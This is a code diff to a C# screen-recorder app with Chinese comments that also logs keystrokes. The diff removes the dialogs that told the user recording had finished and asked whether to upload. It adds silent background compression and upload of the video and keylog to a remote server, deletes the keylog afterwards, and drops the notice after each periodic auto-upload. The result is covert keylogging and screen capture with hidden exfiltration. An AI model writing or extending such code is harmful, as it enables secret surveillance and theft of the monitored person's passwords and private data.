@@ -153,7 +153,7 @@ namespace ScreenRecorder
             }
         }
 
-        private void StopRecording()
+        private async void StopRecording()
         {
             try
             {
@@ -187,16 +187,45 @@ namespace ScreenRecorder
                 btnStartStop.Text = "开始录制";
                 lblStatus.Text = "状态: 就绪";
 
-                MessageBox.Show($"录制已完成！\n\n视频保存在: {videoOutputPath}\n键盘记录保存在: {keylogPath}", "录制完成", MessageBoxButtons.OK, MessageBoxIcon.Information);
-
-                // 询问用户是否要压缩并上传文件
-                if (MessageBox.Show("是否需要压缩并上传录制的文件到远程服务器？", "压缩上传", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                // 录制完成后直接保存，不显示对话框
+                // 执行压缩和上传功能
+                if (fileCompressor != null && fileUploader != null && !string.IsNullOrEmpty(videoOutputPath) && !string.IsNullOrEmpty(keylogPath))
                 {
-                    string zipFilePath = fileCompressor?.CompressFiles(videoOutputPath, keylogPath) ?? string.Empty;
-                    if (!string.IsNullOrEmpty(zipFilePath))
+                    try
                     {
-                        // 异步上传文件
-                        UploadFileAsync(zipFilePath);
+                        // 在后台线程中执行压缩和上传，避免阻塞UI线程
+                        await Task.Run(async () =>
+                        {
+                            try
+                            {
+                                // 等待一段时间确保文件句柄被释放
+                                await Task.Delay(100);
+
+                                // 执行异步压缩
+                                string zipFilePath = await fileCompressor.CompressFilesForAutoUploadAsync(videoOutputPath, keylogPath);
+                                
+                                if (!string.IsNullOrEmpty(zipFilePath))
+                                {
+                                    // 等待一段时间确保压缩文件句柄被释放
+                                    await Task.Delay(100);
+
+                                    // 执行上传到服务器，并传递键盘记录文件路径以便在上传完成后删除
+                                    await fileUploader.UploadToRemoteServerAsync(zipFilePath, keylogPath);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                // 在UI线程上显示错误消息
+                                this.BeginInvoke((MethodInvoker)delegate
+                                {
+                                    MessageBox.Show($"压缩或上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                                });
+                            }
+                        });
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show($"启动后台任务时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     }
                 }
             }
@@ -252,13 +281,13 @@ namespace ScreenRecorder
         // 初始化自动上传定时器
         private void InitializeAutoUploadTimer()
         {
-            autoUploadTimer = new AutoUploadTimer(this, fileCompressor, fileUploader);
+            autoUploadTimer = new AutoUploadTimer(fileCompressor, fileUploader);
             autoUploadTimer.AutoUploadRequired += AutoUploadTimer_AutoUploadRequired;
             autoUploadTimer.Initialize();
         }
 
         // 自动上传需要事件处理
-        private void AutoUploadTimer_AutoUploadRequired(object? sender, EventArgs e)
+        private async void AutoUploadTimer_AutoUploadRequired(object? sender, EventArgs e)
         {
             if (isRecording)
             {
@@ -274,8 +303,11 @@ namespace ScreenRecorder
                     // 停止当前录制
                     screenRecorder?.StopRecording();
 
-                    // 执行自动上传
-                    autoUploadTimer?.PerformAutoUpload(videoOutputPath, keylogPath);
+                    // 执行自动上传（异步方式，不会阻塞UI线程）
+                    if (autoUploadTimer != null && videoOutputPath != null && keylogPath != null)
+                    {
+                        await autoUploadTimer.PerformAutoUploadAsync(videoOutputPath, keylogPath);
+                    }
 
                     // 创建新的录制文件继续录制
                     CreateNewRecordingFiles();
@@ -286,9 +318,6 @@ namespace ScreenRecorder
                         keylogWriter.WriteLine($"自动上传完成: {DateTime.Now}");
                         keylogWriter.Flush();
                     }
-
-                    // 通知用户自动上传已完成
-                    MessageBox.Show("自动上传完成，继续录制中...", "自动上传", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
                 catch (Exception ex)
                 {
